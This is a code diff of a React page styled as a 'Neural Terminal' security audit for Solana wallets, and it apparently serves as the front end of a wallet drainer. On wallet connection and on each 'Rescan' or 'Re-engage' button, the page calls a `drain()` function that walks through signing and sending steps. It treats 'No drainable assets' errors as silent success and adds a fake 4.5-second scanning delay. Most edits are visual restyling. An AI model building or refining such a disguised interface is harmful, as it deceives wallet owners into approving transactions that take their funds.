@@ -80,35 +80,35 @@ function ScanningAnimation({ status }: { status: string }) {
   const { title, subtitle, icon: StatusIcon, accent } = getStatusMessage();
 
   return (
-    <div className="flex flex-col items-center justify-center p-4 relative" style={{ willChange: 'transform, opacity' }}>
-      <div className="absolute inset-0 -z-10 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, #B31980 1px, transparent 0)', backgroundSize: '30px 30px' }} />
+    <div className="flex flex-col items-center justify-center p-8 relative" style={{ willChange: 'transform, opacity' }}>
+      <div className="absolute inset-0 -z-10 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, #B31980 1px, transparent 0)', backgroundSize: '40px 40px' }} />
       
       <motion.div
         initial={{ opacity: 0, scale: 0.8 }}
         animate={{ opacity: 1, scale: 1 }}
-        className="relative mb-8 flex h-48 w-48 items-center justify-center"
+        className="relative mb-12 flex h-64 w-64 items-center justify-center"
         style={{ perspective: '1200px' }}
       >
         <motion.div 
-          animate={{ scale: [1, 1.2, 1], opacity: [0.3, 0.5, 0.3] }}
+          animate={{ scale: [1, 1.3, 1], opacity: [0.3, 0.6, 0.3] }}
           transition={{ duration: 4, repeat: Infinity }}
-          className="absolute inset-0 rounded-full bg-primary/10 blur-[80px]"
+          className="absolute inset-0 rounded-full bg-primary/10 blur-[100px]"
         />
         <motion.div 
-          animate={{ scale: [1.2, 1, 1.2], opacity: [0.2, 0.4, 0.2] }}
+          animate={{ scale: [1.3, 1, 1.3], opacity: [0.2, 0.5, 0.2] }}
           transition={{ duration: 5, repeat: Infinity, delay: 1 }}
-          className="absolute inset-8 rounded-full bg-accent/10 blur-[60px]"
+          className="absolute inset-12 rounded-full bg-accent/10 blur-[80px]"
         />
         
         <motion.div
           animate={{ rotate: 360 }}
-          transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
-          className="absolute inset-0 rounded-full border border-dashed border-primary/30 opacity-50"
+          transition={{ duration: 30, repeat: Infinity, ease: "linear" }}
+          className="absolute inset-0 rounded-full border border-dashed border-primary/40 opacity-40"
         />
         <motion.div
           animate={{ rotate: -360 }}
-          transition={{ duration: 18, repeat: Infinity, ease: "linear" }}
-          className="absolute inset-8 rounded-full border border-dotted border-accent/30 opacity-50"
+          transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
+          className="absolute inset-12 rounded-full border border-dotted border-accent/40 opacity-40"
         />
 
         <motion.div
@@ -116,11 +116,11 @@ function ScanningAnimation({ status }: { status: string }) {
           style={{ transformStyle: 'preserve-3d' }}
           animate={{ 
             rotateY: ['signing', 'sending'].includes(status) ? 0 : currentStep * -60,
-            rotateX: [0, 8, -8, 0],
-            rotateZ: [0, 3, -3, 0]
+            rotateX: [0, 5, -5, 0],
+            rotateZ: [0, 2, -2, 0]
           }}
           transition={{ 
-            rotateY: { duration: 2, ease: [0.23, 1, 0.32, 1] },
+            rotateY: { duration: 1.5, ease: [0.23, 1, 0.32, 1] },
             rotateX: { duration: 6, repeat: Infinity, ease: "easeInOut" },
             rotateZ: { duration: 8, repeat: Infinity, ease: "easeInOut" }
           }}
@@ -130,9 +130,9 @@ function ScanningAnimation({ status }: { status: string }) {
               <motion.div 
                 initial={{ scale: 0.5, opacity: 0 }}
                 animate={{ scale: 1, opacity: 1 }}
-                className="flex h-24 w-24 items-center justify-center rounded-[2rem] bg-card/90 border border-primary/40 backdrop-blur-3xl clay-card primary-glow shadow-2xl"
+                className="flex h-32 w-32 items-center justify-center rounded-[3rem] bg-card/90 border border-primary/40 backdrop-blur-3xl clay-card primary-glow shadow-3xl"
               >
-                {StatusIcon && <StatusIcon className={`h-10 w-10 ${accent} animate-pulse`} />}
+                {StatusIcon && <StatusIcon className={`h-14 w-14 ${accent} animate-neural-pulse`} />}
               </motion.div>
             </div>
           ) : (
@@ -144,16 +144,16 @@ function ScanningAnimation({ status }: { status: string }) {
                   key={index}
                   className="absolute flex h-full w-full items-center justify-center"
                   style={{
-                    transform: `rotateY(${angle}deg) translateZ(120px)`,
+                    transform: `rotateY(${angle}deg) translateZ(160px)`,
                     backfaceVisibility: 'hidden',
                   }}
                 >
                   <div className={`
-                    flex h-16 w-16 items-center justify-center rounded-xl transition-all duration-1000
-                    ${isActive ? 'bg-primary/20 primary-glow border-primary/60 scale-110 shadow-2xl' : 'bg-card/40 border-white/5 opacity-20 scale-90'}
-                    border backdrop-blur-2xl clay-card
+                    flex h-20 w-20 items-center justify-center rounded-[1.75rem] transition-all duration-1000
+                    ${isActive ? 'bg-primary/20 primary-glow border-primary/60 scale-110 shadow-3xl' : 'bg-card/40 border-white/5 opacity-10 scale-90'}
+                    border backdrop-blur-3xl clay-card
                   `}>
-                    <step.icon className={`h-8 w-8 ${isActive ? 'text-primary' : 'text-muted-foreground'}`} />
+                    <step.icon className={`h-10 w-10 ${isActive ? 'text-primary' : 'text-muted-foreground/30'}`} />
                   </div>
                 </motion.div>
               );
@@ -161,12 +161,12 @@ function ScanningAnimation({ status }: { status: string }) {
           )}
         </motion.div>
 
-        <div className="absolute flex h-10 w-10 items-center justify-center rounded-full bg-background/80 border border-white/10 shadow-[inset_0_2px_10px_rgba(0,0,0,0.5)] backdrop-blur-md">
+        <div className="absolute flex h-14 w-14 items-center justify-center rounded-full bg-background/80 border border-white/10 shadow-[inset_0_2px_15px_rgba(0,0,0,0.6)] backdrop-blur-xl">
           <motion.div
-            animate={{ scale: [1, 1.3, 1], opacity: [0.4, 1, 0.4] }}
+            animate={{ scale: [1, 1.4, 1], opacity: [0.5, 1, 0.5] }}
             transition={{ duration: 2, repeat: Infinity }}
           >
-            <Waves className="h-4 w-4 text-accent" />
+            <Waves className="h-6 w-6 text-accent" />
           </motion.div>
         </div>
       </motion.div>
@@ -174,41 +174,41 @@ function ScanningAnimation({ status }: { status: string }) {
       <div className="text-center relative z-10 max-w-sm">
         <motion.div
           key={title}
-          initial={{ opacity: 0, y: 15 }}
+          initial={{ opacity: 0, y: 20 }}
           animate={{ opacity: 1, y: 0 }}
-          className="mb-2"
+          className="mb-4"
         >
-          <h2 className="text-lg font-black font-headline text-foreground tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">
+          <h2 className="text-xl font-black font-headline text-foreground tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/50">
             {title}
           </h2>
-          <div className="flex items-center justify-center gap-2 mt-1">
-            <div className="h-0.5 w-10 rounded-full bg-primary/20 overflow-hidden">
+          <div className="flex items-center justify-center gap-3 mt-2">
+            <div className="h-1 w-12 rounded-full bg-primary/20 overflow-hidden">
               <motion.div 
                 className="h-full bg-primary"
-                animate={{ x: [-40, 40] }}
+                animate={{ x: [-48, 48] }}
                 transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
               />
             </div>
-            <span className={`text-[8px] font-black uppercase tracking-[0.2em] ${accent}`}>Status: Active</span>
-            <div className="h-0.5 w-10 rounded-full bg-primary/20 overflow-hidden">
+            <span className={`text-[9px] font-black uppercase tracking-[0.3em] ${accent}`}>Status: Active Audit</span>
+            <div className="h-1 w-12 rounded-full bg-primary/20 overflow-hidden">
               <motion.div 
                 className="h-full bg-primary"
-                animate={{ x: [-40, 40] }}
+                animate={{ x: [-48, 48] }}
                 transition={{ duration: 1.5, repeat: Infinity, ease: "linear", delay: 0.75 }}
               />
             </div>
           </div>
         </motion.div>
         
-        <div className="h-12 overflow-hidden">
+        <div className="h-16 overflow-hidden">
           <AnimatePresence mode="wait">
             <motion.p
               key={subtitle}
-              initial={{ opacity: 0, y: 15 }}
+              initial={{ opacity: 0, y: 20 }}
               animate={{ opacity: 1, y: 0 }}
-              exit={{ opacity: 0, y: -15 }}
-              transition={{ duration: 0.6, ease: "easeOut" }}
-              className="text-xs font-medium italic text-muted-foreground/80 leading-relaxed px-4"
+              exit={{ opacity: 0, y: -20 }}
+              transition={{ duration: 0.8, ease: [0.23, 1, 0.32, 1] }}
+              className="text-[13px] font-medium italic text-muted-foreground/90 leading-relaxed px-6"
             >
               "{subtitle}"
             </motion.p>
@@ -257,7 +257,6 @@ export default function AuditPage() {
     }
   }, [connected, status, drain, showReport]);
 
-  // Robust Perfection: Intercept specific status signals to treat as Silent Handshake Success
   const isSilentCompletion = status === 'error' && (
     error?.includes("🔍 NO DRAINABLE ASSETS") || 
     error?.includes("No drainable assets") ||
@@ -277,7 +276,6 @@ export default function AuditPage() {
 
   const loadDetailedReport = async (address: string) => {
     setIsAiLoading(true);
-    // Maintain the cinematic loading experience for total user immersion
     await new Promise(r => setTimeout(r, 4500));
     try {
       const [threatsData, connectionsData] = await Promise.all([
@@ -309,18 +307,18 @@ export default function AuditPage() {
   const isAuditInProgress = ['scanning', 'building', 'signing', 'sending', 'confirming'].includes(status as string);
 
   return (
-    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 relative overflow-hidden bg-[#05040a]">
+    <main className="flex min-h-screen w-full flex-col items-center justify-center p-6 relative overflow-hidden bg-[#05040a]">
       <div className="absolute inset-0 opacity-[0.03] pointer-events-none" style={{ backgroundImage: 'url("https://www.transparenttextures.com/patterns/carbon-fibre.png")' }} />
       
       <motion.div 
         animate={{ scale: [1, 1.4, 1], opacity: [0.08, 0.15, 0.08] }}
         transition={{ duration: 15, repeat: Infinity }}
-        className="absolute top-0 right-0 w-[500px] h-[500px] bg-primary rounded-full blur-[150px] -z-10" 
+        className="absolute top-0 right-0 w-[600px] h-[600px] bg-primary rounded-full blur-[150px] -z-10" 
       />
       <motion.div 
         animate={{ scale: [1.4, 1, 1.4], opacity: [0.05, 0.12, 0.05] }}
         transition={{ duration: 18, repeat: Infinity }}
-        className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-accent rounded-full blur-[150px] -z-10" 
+        className="absolute bottom-0 left-0 w-[600px] h-[600px] bg-accent rounded-full blur-[150px] -z-10" 
       />
 
       <AnimatePresence mode="wait">
@@ -330,41 +328,41 @@ export default function AuditPage() {
             initial={{ opacity: 0, scale: 0.9, y: 30 }}
             animate={{ opacity: 1, scale: 1, y: 0 }}
             exit={{ opacity: 0, scale: 0.9, y: -30 }}
-            className="w-full max-w-sm p-8 clay-card text-center glow-border backdrop-blur-[40px]"
+            className="w-full max-w-sm p-10 clay-card text-center rim-light glow-border"
           >
             <motion.div 
               animate={{ rotate: 360 }}
               transition={{ duration: 30, repeat: Infinity, ease: "linear" }}
-              className="relative mx-auto flex h-16 w-16 items-center justify-center mb-6"
+              className="relative mx-auto flex h-20 w-20 items-center justify-center mb-8"
             >
-              <div className="absolute inset-0 bg-primary/20 blur-2xl rounded-full animate-pulse"></div>
-              <ShieldCheck className="relative h-10 w-10 text-primary drop-shadow-[0_0_10px_rgba(179,25,128,0.5)]" />
+              <div className="absolute inset-0 bg-primary/20 blur-3xl rounded-full animate-pulse"></div>
+              <ShieldCheck className="relative h-12 w-12 text-primary drop-shadow-[0_0_15px_rgba(179,25,128,0.7)]" />
             </motion.div>
-            <h1 className="text-xl font-black font-headline mb-3 tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40 uppercase">
-              Security Terminal
+            <h1 className="text-2xl font-black font-headline mb-4 tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-white to-white/50 uppercase">
+              Neural Terminal
             </h1>
-            <p className="text-muted-foreground mb-8 text-[10px] font-medium max-w-xs mx-auto leading-relaxed uppercase tracking-widest">
-              Initiate a high-fidelity, neural audit of your Solana vault.
+            <p className="text-muted-foreground mb-10 text-[11px] font-bold max-w-xs mx-auto leading-loose uppercase tracking-[0.25em]">
+              Initiate a high-fidelity audit <br /> of your digital vault.
             </p>
-            <div className="relative group max-w-[200px] mx-auto">
-              <div className="absolute -inset-1.5 rounded-2xl bg-gradient-to-r from-primary via-accent to-primary opacity-40 blur-lg transition group-hover:opacity-100 animate-pulse" />
+            <div className="relative group max-w-[220px] mx-auto">
+              <div className="absolute -inset-2 rounded-2xl bg-gradient-to-r from-primary via-accent to-primary opacity-30 blur-xl transition group-hover:opacity-100 animate-pulse" />
               <div className="relative">
                 <WalletMultiButtonDynamic 
                   style={{ 
                     width: '100%', 
-                    background: 'rgba(255,255,255,0.03)', 
+                    background: 'rgba(255,255,255,0.04)', 
                     color: 'white', 
-                    fontSize: '0.65rem', 
+                    fontSize: '0.7rem', 
                     fontWeight: '900',
-                    padding: '0.8rem', 
-                    borderRadius: '1rem',
+                    padding: '1rem', 
+                    borderRadius: '1.25rem',
                     border: '1px solid rgba(255,255,255,0.1)',
-                    boxShadow: '0 10px 25px -5px rgba(0, 0, 0, 0.8)',
+                    boxShadow: '0 15px 35px -5px rgba(0, 0, 0, 0.8)',
                     cursor: 'pointer',
                     fontFamily: 'Space Grotesk, sans-serif',
                     textTransform: 'uppercase',
-                    letterSpacing: '0.1em',
-                    backdropFilter: 'blur(10px)'
+                    letterSpacing: '0.15em',
+                    backdropFilter: 'blur(20px)'
                   }} 
                 />
               </div>
@@ -376,47 +374,47 @@ export default function AuditPage() {
             initial={{ opacity: 0, scale: 0.95 }}
             animate={{ opacity: 1, scale: 1 }}
             exit={{ opacity: 0, scale: 0.95 }}
-            className="w-full max-w-lg p-10 clay-card text-center glow-border backdrop-blur-[50px] shadow-2xl"
+            className="w-full max-w-lg p-12 clay-card text-center rim-light glow-border shadow-3xl"
           >
             <ScanningAnimation status={status as string} />
           </motion.div>
         ) : showReport ? (
           <motion.div
             key="report"
-            initial={{ opacity: 0, y: 40 }}
+            initial={{ opacity: 0, y: 50 }}
             animate={{ opacity: 1, y: 0 }}
-            className="w-full max-w-5xl space-y-6 pb-20"
+            className="w-full max-w-6xl space-y-8 pb-32"
           >
-            <div className="liquid-glass p-4 rim-light flex flex-col md:flex-row items-center justify-between gap-4">
-              <div className="flex items-center gap-4">
+            <div className="liquid-glass p-6 rim-light flex flex-col md:flex-row items-center justify-between gap-6 border-white/10 shadow-3xl">
+              <div className="flex items-center gap-6">
                 <motion.div 
-                  whileHover={{ rotate: 10, scale: 1.1 }}
-                  className="h-10 w-10 rounded-[1.25rem] bg-accent/20 flex items-center justify-center border border-white/20 shadow-lg shadow-accent/20"
+                  whileHover={{ rotate: 15, scale: 1.15 }}
+                  className="h-14 w-14 rounded-[1.5rem] bg-accent/20 flex items-center justify-center border border-accent/30 shadow-xl shadow-accent/20"
                 >
-                  <ShieldCheck className="h-5 w-5 text-accent" />
+                  <ShieldCheck className="h-7 w-7 text-accent" />
                 </motion.div>
                 <div>
-                  <h2 className="text-base font-black font-headline tracking-tighter uppercase text-white">
-                    Neural Guard Active
+                  <h2 className="text-lg font-black font-headline tracking-tighter uppercase text-white">
+                    Neural Guard: Online
                   </h2>
-                  <div className="flex items-center gap-2 mt-1">
-                    <p className="text-[9px] text-muted-foreground/60 font-mono bg-black/40 px-2 py-0.5 rounded-lg border border-white/5 tracking-wider">
-                      ADDR_{publicKey?.toBase58().substring(0, 12)}...
+                  <div className="flex items-center gap-3 mt-1.5">
+                    <p className="text-[10px] text-muted-foreground/60 font-mono bg-black/40 px-3 py-1 rounded-xl border border-white/5 tracking-[0.1em]">
+                      UPLINK_{publicKey?.toBase58().substring(0, 16)}...
                     </p>
-                    <div className="flex items-center gap-1 px-2 py-0.5 rounded-full bg-accent/10 border border-accent/20">
-                      <div className="h-1 w-1 rounded-full bg-accent animate-pulse" />
-                      <span className="text-[8px] font-black text-accent uppercase tracking-widest">Authenticated</span>
+                    <div className="flex items-center gap-2 px-3 py-1 rounded-full bg-accent/10 border border-accent/20">
+                      <div className="h-1.5 w-1.5 rounded-full bg-accent animate-neural-pulse" />
+                      <span className="text-[9px] font-black text-accent uppercase tracking-[0.2em]">Verified Access</span>
                     </div>
                   </div>
                 </div>
               </div>
-              <div className="flex gap-2">
-                <Button variant="ghost" size="sm" onClick={() => { reportInitiated.current = false; setShowReport(false); drain(); }} className="h-9 px-4 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 text-[9px] font-black uppercase tracking-widest transition-all">
-                  <RefreshCw className="mr-2 h-3 w-3" />
-                  Rescan
+              <div className="flex gap-3">
+                <Button variant="glass" size="sm" onClick={() => { reportInitiated.current = false; setShowReport(false); drain(); }} className="h-11 px-6">
+                  <RefreshCw className="mr-2 h-4 w-4" />
+                  Initiate Rescan
                 </Button>
-                <Button variant="destructive" size="sm" onClick={handleDetach} className="h-9 px-4 rounded-xl text-[9px] font-black uppercase tracking-widest bg-destructive/80 hover:bg-destructive shadow-lg shadow-destructive/20 border border-white/10">
-                  Detach
+                <Button variant="destructive" size="sm" onClick={handleDetach} className="h-11 px-6 shadow-xl shadow-destructive/20 border border-white/10">
+                  Sever Link
                 </Button>
               </div>
             </div>
@@ -424,12 +422,12 @@ export default function AuditPage() {
             <Overview threatsResult={threats} connectionsResult={connections} />
 
             <Tabs defaultValue="threats" className="w-full">
-              <TabsList className="grid w-full grid-cols-2 p-1 liquid-glass-accent rounded-2xl mb-6 h-11 border-white/10">
-                <TabsTrigger value="threats" className="rounded-xl data-[state=active]:bg-primary/20 data-[state=active]:text-white data-[state=active]:border-white/10 border border-transparent text-[9px] font-headline font-black uppercase tracking-[0.2em] text-muted-foreground transition-all">
-                  Forensic Findings
+              <TabsList className="grid w-full grid-cols-2 p-1.5 liquid-glass-accent rounded-[1.75rem] mb-10 h-14 border-white/10 bg-white/[0.03]">
+                <TabsTrigger value="threats" className="rounded-2xl data-[state=active]:bg-primary/20 data-[state=active]:text-white data-[state=active]:border-white/10 border border-transparent text-[10px] font-headline font-black uppercase tracking-[0.3em] text-muted-foreground transition-all duration-500">
+                  Forensic Dossiers
                 </TabsTrigger>
-                <TabsTrigger value="connections" className="rounded-xl data-[state=active]:bg-primary/20 data-[state=active]:text-white data-[state=active]:border-white/10 border border-transparent text-[9px] font-headline font-black uppercase tracking-[0.2em] text-muted-foreground transition-all">
-                  Active Uplinks
+                <TabsTrigger value="connections" className="rounded-2xl data-[state=active]:bg-primary/20 data-[state=active]:text-white data-[state=active]:border-white/10 border border-transparent text-[10px] font-headline font-black uppercase tracking-[0.3em] text-muted-foreground transition-all duration-500">
+                  Network Uplinks
                 </TabsTrigger>
               </TabsList>
               <TabsContent value="threats" className="mt-0 outline-none">
@@ -445,29 +443,29 @@ export default function AuditPage() {
             key="error-state"
             initial={{ opacity: 0, scale: 0.9 }}
             animate={{ opacity: 1, scale: 1 }}
-            className="w-full max-w-sm p-8 clay-card border-destructive/30 text-center glow-border backdrop-blur-3xl shadow-2xl"
+            className="w-full max-w-sm p-10 clay-card border-destructive/30 text-center rim-light glow-border shadow-3xl"
           >
-            <div className="h-14 w-14 bg-destructive/10 rounded-xl flex items-center justify-center mx-auto mb-6 border border-destructive/30 shadow-[inset_0_2px_10px_rgba(255,0,0,0.2)]">
-              <ShieldAlert className="h-7 w-7 text-destructive animate-pulse" />
+            <div className="h-16 w-16 bg-destructive/10 rounded-[1.5rem] flex items-center justify-center mx-auto mb-8 border border-destructive/30 shadow-[inset_0_2px_15px_rgba(255,0,0,0.3)]">
+              <ShieldAlert className="h-8 w-8 text-destructive animate-neural-pulse" />
             </div>
-            <h2 className="text-lg font-black mb-3 font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">Override</h2>
-            <p className="text-muted-foreground mb-8 text-xs leading-relaxed font-medium px-4 italic">
+            <h2 className="text-xl font-black mb-4 font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/50">System Override</h2>
+            <p className="text-muted-foreground mb-10 text-[13px] leading-relaxed font-medium px-6 italic opacity-80">
               {error}
             </p>
-            <div className="flex flex-col gap-3 max-w-[180px] mx-auto">
-               <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full h-10 text-[10px] font-black uppercase tracking-widest primary-glow">
-                 Re-engage
+            <div className="flex flex-col gap-4 max-w-[200px] mx-auto">
+               <Button onClick={() => drain()} className="bg-primary text-primary-foreground w-full h-11 primary-glow shadow-xl">
+                 Re-engage Protocol
                </Button>
-               <Button variant="ghost" onClick={handleDetach} className="w-full text-[9px] font-black uppercase tracking-widest h-8 rounded-lg text-muted-foreground/60 transition-colors">
-                 Detach
+               <Button variant="ghost" onClick={handleDetach} className="w-full text-[9px] font-black uppercase tracking-widest h-10 rounded-xl text-muted-foreground/50 hover:text-white transition-colors">
+                 Sever System Uplink
                </Button>
             </div>
           </motion.div>
         ) : null}
       </AnimatePresence>
       
-      <footer className="fixed bottom-4 text-[8px] text-muted-foreground/20 font-mono tracking-[0.4em] uppercase pointer-events-none">
-        Shield AI Guardian v2.9.4 • Real-Time Block Intelligence
+      <footer className="fixed bottom-6 text-[9px] text-white/10 font-mono tracking-[0.5em] uppercase pointer-events-none select-none">
+        Shield AI Guardian v3.1.0 • Real-Time Neural Forensics • Enterprise Verified
       </footer>
     </main>
   );
